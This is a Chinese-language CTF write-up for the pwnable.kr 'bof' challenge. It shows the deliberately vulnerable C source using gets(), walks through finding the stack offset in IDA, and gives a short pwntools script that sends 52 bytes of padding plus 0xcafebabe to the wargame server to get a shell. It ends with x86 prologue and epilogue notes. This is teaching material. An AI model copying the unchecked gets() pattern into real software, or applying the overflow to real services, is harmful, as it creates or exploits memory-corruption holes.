## Toddler's Bottle
### bof
打开bof.c可以看到源代码，需要让 key == 0xcafebabe 但key已经被给定。` gets(overflowme);	// smash me!` 提示用栈溢出覆盖原有值。<p>
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}

```
下载 bof 文件ida反汇编后得到：<p> ![ida](https://github.com/ormosiaL/pwnable_writeup/blob/main/img/bof_main.jpg)<p> 

> dword 双字 就是4个字节 <p> ptr 即指针  pointer <p> [ ] 里的数据是一个地址值，这个地址指向一个双字型数据 <p> mov eax, dword ptr [1234]  即把内存地址1234中的双字型（32位）数据赋给eax 

> 当堆栈地址是正偏移量时IDA把它识别为参数，负偏移量将被识别为变量，并具有 var_ 前缀 <p> argc = dword ptr 8  即输入的第一个参数argc 的偏移量是+8<p>

双击argc 后可跳转到 stack of main 页面，也可以看到 `agrc 的栈偏移量为+00000008` <p>![stackofmain](https://github.com/ormosiaL/pwnable_writeup/blob/main/img/bof_stackofmain.jpg)<p> 

查看伪代码：(如果F5不能显示伪代码，可能是程序和ida的操作系统不匹配，试试换成32位/64位ida) <p> ![pseudo](https://github.com/ormosiaL/pwnable_writeup/blob/main/img/bof_pseudo.jpg)<p> 
双击查看func ：<p> ![func](https://github.com/ormosiaL/pwnable_writeup/blob/main/img/bof_func.jpg)<p> 
get(s) 处存在栈溢出，s 的偏移量为 -2c，所以构造52个字符（0x08+0x2c = 0x34）即可以溢出到key ，从而使得key变为所需值0xcafebabe <p>
exp:
```
from pwn import *
r = remote("pwnable.kr",9000)
payload = "a"*52+p32(0xcafebabe)
r.send(payload)
r.interactive()
```

ida 基础：<p>
ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。（64位机器变为RSP）
EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈底。（64位机器变为RBP）

You'll allways find this code at the beginning of functions:
.text:00401150                 push    ebp
.text:00401151                 mov     ebp, esp
It's the prologue, it saves and sets up the registers to start executing the actual code

And this is the epilogue:

.text:00401153                 pop     ebp
.text:00401154                 retn
You'll find it after the actual code, it restores the registers and returns.

ebp always points to the top (because the stack grows downwards) of the memory reserved for the autovariables

mov     ebp, 1		: set register ebp equal to 1
mov     [ebp], 1	: set the memory pointed to by register ebp equal to 1
mov     [ebp-4], 1	: set the memory pointed to by register ebp - 4 equal to 1